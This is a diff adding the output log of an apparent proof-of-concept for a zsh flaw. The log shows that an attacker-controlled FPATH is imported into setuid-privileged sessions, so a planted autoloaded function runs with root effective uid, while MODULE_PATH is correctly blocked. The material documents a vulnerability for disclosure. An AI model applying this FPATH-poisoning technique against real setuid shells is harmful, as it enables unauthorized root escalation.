@@ -1,0 +1,24 @@
+[*] real/effective uid of this whole demo: uid=0(root) gid=0(root) groups=0(root)
+
+[setup] installed setuid-root zsh at /tmp/finding3_poc/zsh-suid:
+-rwsr-xr-x 1 root root 869776 Oct 10 04:42 /tmp/finding3_poc/zsh-suid
+[setup] unprivileged test account: uid=30033(poc_fpath_attacker) gid=30033(poc_fpath_attacker) groups=30033(poc_fpath_attacker)
+[setup] created /etc/zshrc with autoload (simulating real-world system config)
+
+=== SCENARIO A (control): PRIVILEGED session, default FPATH ===
+  RESULT: autoloaded function did not run (FPATH doesn't point to attacker dir)
+
+=== SCENARIO B (the bug): PRIVILEGED session, attacker-controlled FPATH ===
+[attacker] planted malicious _system_setup in /tmp/finding3_poc/evil_fpath
+  RESULT: FPATH-poisoned function FIRED
+  --- proof file contents ---
+uid=30033(poc_fpath_attacker) gid=30033(poc_fpath_attacker) euid=0(root) groups=30033(poc_fpath_attacker)
+FPATH POISONED: autoloaded function ran as root, euid=0
+
+=== SCENARIO C (comparison): MODULE_PATH is correctly blocked in PRIVILEGED ===
+  /tmp/claude-0/-home-user-zsh/14dd82eb-cfce-587d-8341-e9832022a994/scratchpad/zshinstall/lib/zsh/5.9
+  (MODULE_PATH should NOT contain /tmp/evil_modules -- it's correctly PM_DONTIMPORT)
+
+=== SCENARIO D: directly proving FPATH is imported in PRIVILEGED mode ===
+  FPATH=/ATTACKER/CONTROLLED/PATH:/usr/share/zsh/functions
+  (FPATH should contain /ATTACKER/CONTROLLED/PATH -- it's NOT blocked by PM_DONTIMPORT_SUID)
